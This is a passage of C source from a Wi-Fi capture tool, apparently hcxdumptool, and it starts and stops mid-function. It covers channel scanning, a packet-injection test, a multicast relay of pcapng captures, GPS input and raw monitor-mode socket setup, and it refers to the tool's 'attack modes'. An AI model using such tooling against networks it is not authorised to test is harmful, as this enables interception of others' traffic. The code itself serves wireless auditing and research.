if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
printrcascan();
while(wantstopflag == false)
	{
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		if(forceinterfaceflag == false) globalclose();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		ptrfscanlist++;
		if(ptrfscanlist->frequency == 0) ptrfscanlist = fscanlist;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %gpiostatusledflashinterval) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incomingcountold == incomingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incomingcountold = incomingcount;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		printrcascan();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	tsfd.tv_sec = 0;
	tsfd.tv_nsec = FDNSECTIMER;
	fdnum = pselect(sd +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet_rca();
	else
		{
		ptrfscanlist++;
		if(ptrfscanlist->frequency == 0) ptrfscanlist = fscanlist;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		}
	}
globalclose();
return;
}
/*===========================================================================*/
static inline void process_fd_injection()
{
static int sd;
static int fdnum;
static fd_set readfds;
static scanlist_t *zeiger;
static struct timespec tsfd;
static bool inject24 = false;
static bool inject5 = false;
static bool inject6 = false;
static int networkcount = 0;
static int networkhit = 0;
static int networkratio = 0;
static int stagecount = 1;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tsfd.tv_sec = 0;
tsfd.tv_nsec = FDNSECTIMER;
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
attackstatus = 0;
fprintf(stdout, "starting antenna test and packet injection test (that can take up to two minutes)...\n");
ptrfscanlist = fscanlist;
if(set_channel() == false) errorcount++;
while(tvold.tv_sec == tv.tv_sec) gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
fprintf(stdout, "\e[?25lstage %d of 2 probing frequency %d/%d proberesponse %d", stagecount, ptrfscanlist->frequency, ptrfscanlist->channel, responsehit);
while(wantstopflag == false)
	{
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		if(forceinterfaceflag == false) globalclose();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		get_channel();
		tvold.tv_sec = tv.tv_sec;
		if((tv.tv_sec %gpiostatusledflashinterval) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if((tv.tv_sec -tvlast_sec) > WATCHDOG)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			}
		if((tv.tv_sec %2) == 0)
			{
			ptrfscanlist++;
			if(ptrfscanlist->frequency == 0)
				{
				ptrfscanlist = fscanlist;
				stagecount++;
				}
			if(stagecount >= 3) break;
			if(set_channel() == false) continue;
			fprintf(stdout, "\rstage %d of 2 probing frequency %d/%d proberesponse %d   ", stagecount, ptrfscanlist->frequency, ptrfscanlist->channel, responsehit);
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	tsfd.tv_sec = 0;
	tsfd.tv_nsec = FDNSECTIMER;
	fdnum = pselect(sd +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet_rca();
	}
qsort(scanlist, scanlistmax, SCANLIST_SIZE, sort_scanlist_by_hit);
fprintf(stdout, "\e[?25h\n");
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(zeiger->hit > 0)
		{
		if(zeiger->channel < 36) inject24 = true;
		else if((zeiger->channel >= 36) && (zeiger->channel < 200)) inject5 = true;
		else if(zeiger->channel >= 200) inject6 = true;
		injectionhit += zeiger->hit;
		networkhit++;
		}
	injectioncount += zeiger->beacon;
	networkcount++;
	}
if(injectionhit > 0)
	{
	if((injectionhit > 0) && (injectioncount > 0)) injectionratio = (injectionhit *100) /injectioncount;
	if(injectionratio > 100) injectionratio = 100;
	if(inject24 == true) fprintf(stdout, "packet injection is working on 2.4GHz!\n");
	if(inject5 == true) fprintf(stdout, "packet injection is working on 5GHz!\n");
	if(inject6 == true) fprintf(stdout, "packet injection is working on 6GHz!\n");
	fprintf(stdout, "injection ratio: %d%% (BEACON: %d PROBERESPONSE: %d)\n", injectionratio, injectioncount, injectionhit);
	if(injectionratio < 25) fprintf(stdout, "your injection ratio is poor - improve your equipment and/or get closer to the target\n");
	else if((injectionratio >= 25) && (injectionratio < 50)) fprintf(stdout, "your injection ratio is average, but there is still room for improvement\n");
	else if((injectionratio >= 50) && (injectionratio < 75)) fprintf(stdout, "your injection ratio is good\n");
	else if((injectionratio >= 75) && (injectionratio < 90)) fprintf(stdout, "your injection ratio is excellent, let's ride!\n");
	else if(injectionratio > 90) fprintf(stdout, "your injection ratio is huge - say kids what time is it?\n");
	if((networkhit > 0) && (networkcount > 0)) networkratio = (networkhit *100) /networkcount;
	if(networkratio > 100) networkratio = 100;
	fprintf(stdout, "antenna ratio: %d%% (NETWORK: %d PROBERESPONSE: %d)\n", networkratio, networkcount, networkhit);
	if(networkratio < 25) fprintf(stdout, "your incection ratio is poor - improve your antenna and get closer to the target\n");
	else if((networkratio >= 25) && (networkratio < 50)) fprintf(stdout, "your antenna ratio is average, but there is still room for improvement\n");
	else if((networkratio >= 50) && (networkratio < 75)) fprintf(stdout, "your antenna ratio is good\n");
	else if((networkratio >= 75) && (networkratio < 90)) fprintf(stdout, "your antenna ratio is excellent, let's ride!\n");
	else if(networkratio > 90) fprintf(stdout, "your antenna ratio is huge - say kids what time is it?\n");
	}
else fprintf(stdout, "warning: no PROBERESPONSE received - packet injection is probably not working!\n");
errorcount -= radiotaperrorcount;
errorcount -= gpserrorcount;
if(errorcount == 1) fprintf(stdout, "%d driver error encountered during the test\n", errorcount);
if(errorcount > 1) fprintf(stdout, "%d driver errors encountered during the test\n", errorcount);
if(radiotaperrorcount == 1) fprintf(stdout, "%d radiotap error encountered during the test\n", radiotaperrorcount);
if(radiotaperrorcount > 1) fprintf(stdout, "%d radiotap errors encountered during the test\n", radiotaperrorcount);
if(gpserrorcount == 1) fprintf(stdout, "%d GPS error encountered during the test\n", gpserrorcount);
if(gpserrorcount > 1) fprintf(stdout, "%d GPS errors encountered during the test\n", gpserrorcount);
globalclose();
return;
}
/*===========================================================================*/
static inline void process_server()
{
static fd_set readfds;
static struct timespec tsfd;
static struct stat statinfo;
static int fdnum;
static int msglen;
static uint32_t statuscount;
static char serverstatus[SERVERMSG_MAX];
static bool havepcapngheader;
static int c = 0;
static char newpcapngoutname[PATH_MAX +2];
static uint8_t pcapngheader[SERVERMSG_MAX];
static uint8_t temppacket[SERVERMSG_MAX];
static int temppacket_len = 0;
static struct sockaddr_in sockaddrFrom;
static socklen_t sockaddrFrom_len = sizeof(sockaddrFrom);
static int written;

fprintf(stdout, "waiting for hcxdumptool server...\n");
gettimeofday(&tv, NULL);
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
wantstopflag = false;
statuscount = 1;
tsfd.tv_sec = 1;
tsfd.tv_nsec = 0;
havepcapngheader = false;
if(pcapngoutname != NULL)
	{
	clientrequestpcapnghead((struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
	}
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			globalclose();
			}
		}
	if(wantstopflag == true)
		{
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket_mccli, &readfds);
	fdnum = pselect(fd_socket_mccli +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket_mccli, &readfds))
		{
		msglen = recvfrom(fd_socket_mccli, serverstatus, SERVERMSG_MAX, 0, (struct sockaddr*)&sockaddrFrom, &sockaddrFrom_len);
		if(msglen < 1)
			{
			perror("\nfailed to read data from server");
			continue;
			}
		switch(serverstatus[0])
			{
			case SERVERMSG_TYPE_STATUS:
				serverstatus[msglen] = 0;
				fprintf(stdout, "%s", &serverstatus[SERVERMSG_HEAD_SIZE]);
				if((pcapngoutname != NULL) && (havepcapngheader == false) && (pcapngoutname != NULL))
					{
					clientrequestpcapnghead((struct sockaddr*)&sockaddrFrom, sockaddrFrom_len);
					}
				break;
			case SERVERMSG_TYPE_PCAPNGHEAD:
				if(pcapngoutname == NULL) break;
				if((havepcapngheader == true) && (fd_pcapng > 0))
					{
					if(strcmp(pcapngoutname, "-") == 0) break;
					if((memcmp(&pcapngheader, &serverstatus[SERVERMSG_HEAD_SIZE], (msglen -SERVERMSG_HEAD_SIZE)) != 0))
						close(fd_pcapng);
					else break;
					}
				if(strcmp(pcapngoutname, "-") != 0)
					{
					strncpy(newpcapngoutname, pcapngoutname, PATH_MAX);
					while(stat(newpcapngoutname, &statinfo) == 0)
						{
						snprintf(newpcapngoutname, PATH_MAX, "%s-%d", pcapngoutname, c);
						c++;
						}
					umask(0);
					fd_pcapng = open(newpcapngoutname, O_WRONLY | O_CREAT, 0644);
					if(fd_pcapng <= 0)
						{
						fprintf(stderr, "could not create dumpfile %s\n", newpcapngoutname);
						errorcount++;
						globalclose();
						}
					}
				written = write(fd_pcapng, &serverstatus[SERVERMSG_HEAD_SIZE], (msglen -SERVERMSG_HEAD_SIZE));
				if(written != (msglen -SERVERMSG_HEAD_SIZE))
					{
					fprintf(stderr, "could not write to dumpfile %s\n", newpcapngoutname);
					errorcount++;
					globalclose();
					}
				havepcapngheader = true;
				memcpy(&pcapngheader, &serverstatus[SERVERMSG_HEAD_SIZE], (msglen -SERVERMSG_HEAD_SIZE));
				if(temppacket_len > 0)
					{
					written = write(fd_pcapng, &temppacket, temppacket_len);
					if(written != temppacket_len)
						{
						fprintf(stderr, "could not write temppacket to dumpfile %s\n", newpcapngoutname);
						errorcount++;
						globalclose();
						}
					temppacket_len = 0;
					}
				break;
			case SERVERMSG_TYPE_PCAPNG:
				if(pcapngoutname == NULL) break;
				if((havepcapngheader == true) && (fd_pcapng > 0))
					{
					written = write(fd_pcapng, &serverstatus[SERVERMSG_HEAD_SIZE], (msglen -SERVERMSG_HEAD_SIZE));
					if(written != (msglen -SERVERMSG_HEAD_SIZE))
						{
						fprintf(stderr, "could not write to dumpfile %s\n", newpcapngoutname);
						errorcount++;
						globalclose();
						}
					}
				else
					{
					clientrequestpcapnghead((struct sockaddr*)&sockaddrFrom, sockaddrFrom_len);
					memcpy(&temppacket, &serverstatus[SERVERMSG_HEAD_SIZE], (msglen -SERVERMSG_HEAD_SIZE));
					temppacket_len = (msglen -SERVERMSG_HEAD_SIZE);
					}
				break;
			}
		}
	else
		{
		if((statuscount %5) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		statuscount++;
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool checkmonitorinterface(char *checkinterfacename)
{
static const char *vifstr1 = "mon";
static const char *vifstr2 = "prism";

if(checkinterfacename == NULL) return true;
if(strstr(checkinterfacename, vifstr1) == NULL) return false;
if(strstr(checkinterfacename, vifstr2) == NULL) return false;
return true;
}
/*===========================================================================*/
static inline void checkunwanted(const char *unwantedname)
{
static FILE *fp;
static char pidline[1024];
static char *pidptr = NULL;

memset(&pidline, 0, 1024);
fp = popen(unwantedname,"r");
if(fp)
	{
	pidptr = fgets(pidline, 1024, fp);
	if(pidptr != NULL) fprintf(stderr, "warning possible interfere: %s is running with pid %s\n", &unwantedname[6], pidline);
	pclose(fp);
	}
return;
}
/*===========================================================================*/
static inline void checkallunwanted()
{
static const char *networkmanager = "pidof NetworkManager";
static const char *iwd = "pidof iwd";
static const char *wicddaemon = "pidof wicd-daemon";
static const char *wpasupplicant = "pidof wpa_supplicant";
static const char *airodumpng = "pidof lt-airodump-ng";
static const char *kismet = "pidof kismet";

checkunwanted(networkmanager);
checkunwanted(iwd);
checkunwanted(wicddaemon);
checkunwanted(wpasupplicant);
checkunwanted(airodumpng);
checkunwanted(kismet);
return;
}
/*===========================================================================*/
static inline bool openmcclisocket(int mccliport)
{
static int loop;
static struct sockaddr_in mccliaddress;

fd_socket_mccli = 0;
if((fd_socket_mccli = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
	{
	perror ("client socket failed");
	return false;
	}

memset (&mcsrvaddress, 0, sizeof(mcsrvaddress));
mcsrvaddress.sin_family = AF_INET;
mcsrvaddress.sin_addr.s_addr = inet_addr(mcip);
mcsrvaddress.sin_port = htons(mccliport);
memset (&mccliaddress, 0, sizeof(mccliaddress));
mccliaddress.sin_family = AF_INET;
mccliaddress.sin_addr.s_addr = inet_addr(mcip);
mccliaddress.sin_port = htons(mccliport);
loop = 1;
if(setsockopt(fd_socket_mccli, SOL_SOCKET, SO_REUSEADDR, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEADDR failed");
	return false;
}
loop = 1;
if(setsockopt(fd_socket_mccli, SOL_SOCKET, SO_REUSEPORT, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEPORT failed");
	return false;
	}
if(bind(fd_socket_mccli, (struct sockaddr*)&mccliaddress, sizeof(mccliaddress)) < 0)
	{
	perror ("bind client failed");
	return false;
	}
loop = 1;
if(ismulticastip(mcip) == true)
	{
	if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_MULTICAST_LOOP, &loop, sizeof (loop)) < 0)
		{
		perror ("setsockopt() IP_MULTICAST_LOOP failed");
		return false;
		}
	memset(&mcmreq, 0, sizeof(mcmreq));
	mcmreq.imr_multiaddr.s_addr = inet_addr(mcip);
	mcmreq.imr_interface.s_addr = htonl(INADDR_ANY);
	if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0)
		{
		perror ("setsockopt() IP_ADD_MEMBERSHIP failed");
		return false;
		}
	}
return true;
}
/*===========================================================================*/
static inline bool openmcsrvsocket(int mcsrvport)
{
static int loop;
fd_socket_mcsrv = 0;
if((fd_socket_mcsrv = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
	{
	perror("server socket failed");
	return false;
	}
memset (&mcsrvaddress, 0, sizeof(mcsrvaddress));
mcsrvaddress.sin_family = AF_INET;
mcsrvaddress.sin_addr.s_addr = inet_addr(mcip);
mcsrvaddress.sin_port = htons(mcsrvport);
loop = 1;
if(setsockopt(fd_socket_mcsrv, SOL_SOCKET, SO_REUSEADDR, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEADDR failed");
	return false;
	}
loop = 1;
if(setsockopt(fd_socket_mcsrv, SOL_SOCKET, SO_REUSEPORT, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEPORT failed");
	return false;
	}
if(ismulticastip(mcip) == true)
	{
	if((fd_socket_srv = socket (AF_INET, SOCK_DGRAM, 0)) < 0)
		{
		perror("server socket failed");
		return false;
		}
	memset(&srvaddress, 0, sizeof(srvaddress));
	srvaddress.sin_family = AF_INET;
	srvaddress.sin_addr.s_addr = inet_addr(mcip);
	srvaddress.sin_port = htons(mcsrvport);
	loop = 1;
	if(setsockopt(fd_socket_srv, SOL_SOCKET, SO_REUSEADDR, &loop, sizeof (loop)) < 0)
		{
		perror("setsockopt() SO_REUSEADDR failed");
		return false;
	}
	loop = 1;
	if(setsockopt(fd_socket_srv, SOL_SOCKET, SO_REUSEPORT, &loop, sizeof (loop)) < 0)
		{
		perror("setsockopt() SO_REUSEPORT failed");
		return false;
		}
	if(bind(fd_socket_srv, (struct sockaddr*)&srvaddress, sizeof(srvaddress)) < 0)
		{
		perror("server mc socket bind failed");
		close(fd_socket_srv);
		return false;
		}
	loop = 1;
	if(setsockopt(fd_socket_srv, IPPROTO_IP, IP_MULTICAST_LOOP, &loop, sizeof (loop)) < 0)
		{
		perror ("setsockopt() IP_MULTICAST_LOOP failed");
		return false;
		}
	memset(&mcmreq, 0, sizeof(mcmreq));
	mcmreq.imr_multiaddr.s_addr = inet_addr(mcip);
	mcmreq.imr_interface.s_addr = htonl(INADDR_ANY);
	if(setsockopt(fd_socket_srv, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0)
		{
		perror ("setsockopt() IP_ADD_MEMBERSHIP failed");
		return false;
		}
	}
else
	{
	fd_socket_srv = fd_socket_mcsrv;
	}

if(sendto(fd_socket_mcsrv, "\x01hello hcxdumptool client...\n", sizeof ("\x01hello hcxdumptool client...\n"), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress)) < 0)
	{
	perror("server socket failed");
	close(fd_socket_mcsrv);
	return false;
	}
if((pcapngoutname != NULL) && (strcmp(pcapngoutname, "+") == 0))
	{
	fd_pcapng = fd_socket_mcsrv;
	sendpcapngheader();
	}
return true;
}
/*===========================================================================*/
static inline void opengps()
{
static int havegps;
static struct sockaddr_in gpsd_addr;
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";
static const char *gpsd_enable_nmea = "?WATCH={\"enable\":true,\"json\":false,\"nmea\":true}";

nmealen = 0;
if(gpsname != NULL)
	{
	fprintf(stdout, "connecting GPS device...\n");
	if((fd_gps = open(gpsname, O_RDONLY)) < 0)
		{
		perror( "failed to open GPS device");
		fprintf(stderr, "failed to open GPS device\n");
		fd_gps = 0;
		return;
		}
	}
if(gpsdflag == true)
	{
	if((fd_gps = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
		perror( "failed to open GPSD socket");
		fd_gps = 0;
		return;
		}
	fprintf(stdout, "connecting GPSD...\n");
	memset(&gpsd_addr, 0, sizeof(struct sockaddr_in));
	gpsd_addr.sin_family = AF_INET;
	gpsd_addr.sin_port = htons(2947);
	gpsd_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if(connect(fd_gps, (struct sockaddr*) &gpsd_addr, sizeof(gpsd_addr)) < 0)
		{
		perror("failed to connect to GPSD");
		fd_gps = 0;
		return;
		}
	if(write(fd_gps, gpsd_enable_nmea, 47) != 47)
		{
		perror("failed to activate GPSD WATCH");
		fd_gps = 0;
		return;
		}
	}
tsfd.tv_sec = 1;
tsfd.tv_nsec = 0;
havegps = 0;
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	FD_ZERO(&readfds);
	FD_SET(fd_gps, &readfds);
	fdnum = pselect(fd_gps +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		gpserrorcount++;
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds))
		{
		process_gps();
		if(memcmp(&gpgga, nmeasentence, 6) == 0) return;
		if(memcmp(&gprmc, nmeasentence, 6) == 0) return;
		if(havegps > 120) return;
		havegps++;
		}
	else
		{
		if(havegps > 120) return;
		havegps++;
		}
	}
return;
}
/*===========================================================================*/
static inline bool opensocket(bool passiveflag)
{
static struct ethtool_perm_addr *epmaddr;
static struct ifreq ifr;
static struct iwreq iwr;
static struct iw_param param;
static struct sockaddr_ll ll;
static struct packet_mreq mr;
static struct ethtool_drvinfo drvinfo;
static struct iw_param txpower;
static double lfin;
#ifdef PACKET_IGNORE_OUTGOING
static int enable = 1;
#endif

static char *drvhwsim = "mac80211_hwsim";
static char *drvmediatek = "mt7";
static char *drvralink2 = "rt2";
static char *drvralink6 = "rt6";
static char *drvralink7 = "rt7";
static char *drvwarning = " (this driver is not recommended - expect driver errors)";
static char *drvsimulation = " (hardware simulation)";

fd_socket = 0;
memset(&mac_orig, 0, 6);
memset(&mac_virt, 0, 6);
memset(&drivername, 0, 256);
memset(&driverversion, 0, 34);
memset(&driverfwversion, 0, 34);
checkallunwanted();
if(forceinterfaceflag == true)fprintf(stderr, "warning: ioctl() warnings are ignored -  if monitor mode, packet injection or channel switch is not working as expected\n");
if(checkmonitorinterface(interfacename) == true) fprintf(stderr, "warning: %s is probably a virtual monitor interface and some attack modes may not work as expected\n", interfacename);
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror("socket failed");
	return false;
	}
memset(interfaceprotocol, 0, IFNAMSIZ +1);
memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIWNAME, &iwr) < 0)
	{
	perror("failed to detect wlan interface - possible reason:\ninterface not connected\ndriver doesn't support CFG80211\nkernel possible compiled without Wireless Extensions (CONFIG_CFG80211_WEXT=y and CONFIG_CFG80211_WEXT_EXPORT=y)");
	if(forceinterfaceflag == false) return false;
	}
memcpy(&interfaceprotocol, iwr.u.name, IFNAMSIZ);
if(bpf.len > 0)
	{
	if(setsockopt(fd_socket, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) perror("failed to set Berkeley Packet Filter");
	}
memset(&ifr_old, 0, sizeof(ifr));
memcpy(&ifr_old.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr_old) < 0)
	{
	perror("failed to backup current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
	if(forceinterfaceflag == false) return false;
	}
memset(&iwr_old, 0, sizeof(iwr));
memcpy(&iwr_old.ifr_name, interfacename, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIWMODE, &iwr_old) < 0)
	{
	perror("failed to backup current interface mode, ioctl(SIOCGIWMODE) not supported by driver");
	if(forceinterfaceflag == false) return false;
	}
if((iwr_old.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
	{
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface down, ioctl(SIOCSIFFLAGS) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	memset(&iwr, 0, sizeof(iwr));
	memcpy(&iwr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	iwr.u.mode = IW_MODE_MONITOR;
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0)
		{
		perror("failed to set monitor mode, ioctl(SIOCSIWMODE) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	memset(&iwr, 0, sizeof(iwr));
	memcpy(&iwr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	if((iwr.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
		{
		fprintf(stderr, "warning: physical interface is not in monitor mode\n");
		if(forceinterfaceflag == false) return false;
		}
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface up, ioctl(SIOCSIFFLAGS) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		if(forceinterfaceflag == false) return false;
		}
	if((ifr.ifr_flags & (IFF_UP)) != (IFF_UP))
		{
		fprintf(stderr, "warning: interface is not up\n");
		if(forceinterfaceflag == false) return false;
		}
	}
else
	{
	fprintf(stderr, "interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls\n");
	memset(&ifr, 0, sizeof(ifr));
	memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0) perror("failed to get interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
	if((ifr.ifr_flags & (IFF_UP)) != (IFF_UP)) fprintf(stderr, "warning: interface is not up\n");
	}
/* disable power management, if possible */
memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, interfacename, IFNAMSIZ);
iwr.u.power.disabled = 1;
ioctl(fd_socket, SIOCSIWPOWER, &iwr);

memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, interfacename, IFNAMSIZ);
ioctl(fd_socket, SIOCGIWTXPOW, &iwr);
memcpy(&txpower, &(iwr.u.txpower), sizeof(param));
interfacetxpwr = 0;
lfin = (double)txpower.value;
if(txpower.flags & IW_TXPOW_RELATIVE) interfacetxpwr = txpower.value;
else
	{
	if(txpower.flags & IW_TXPOW_MWATT)
		{
		while(lfin > 10.0)
			{
			interfacetxpwr += 10;
			lfin /= 10.0;
			}
		while(lfin > 1.000001)	/* Eliminate rounding errors, take ceil */
			{
			interfacetxpwr += 1;
			lfin /= 1.25892541179;
			}
		}
	else
		{
		interfacetxpwr = txpower.value;
		}
	}

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("failed to get SIOCGIFINDEX, ioctl(SIOCGIFINDEX) not supported by driver");
	return false;
	}
memset(&ll, 0, sizeof(ll));
ll.sll_family = PF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
ll.sll_halen = ETH_ALEN;
ll.sll_pkttype = PACKET_OTHERHOST;
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("failed to bind socket");
	return false;
	}
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = ifr.ifr_ifindex;
mr.mr_type = PACKET_MR_PROMISC;
if(setsockopt(fd_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror("failed to set setsockopt(PACKET_MR_PROMISC)");
	return false;
	}
#if(LINUX_VERSION_CODE >= KERNEL_VERSION(4, 20, 0))
if(setsockopt(fd_socket, SOL_PACKET, PACKET_IGNORE_OUTGOING, &enable, sizeof(int)) < 0) perror("failed to ignore outgoing packets, ioctl(PACKET_IGNORE_OUTGOING) not supported by driver");
#endif
if(passiveflag == false)
	{
	if(set_channel_test(2462) == false)
		{
		fprintf(stderr, "frequency test failed\n");
		return false;
		}
	if(set_channel_test(2412) == false)
		{
		fprintf(stderr, "frequency test failed\n");
		return false;
		}
	}
epmaddr = (struct ethtool_perm_addr*)calloc(1, sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, interfacename, IFNAMSIZ);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	return false;
	}
if(epmaddr->size != 6)
	{
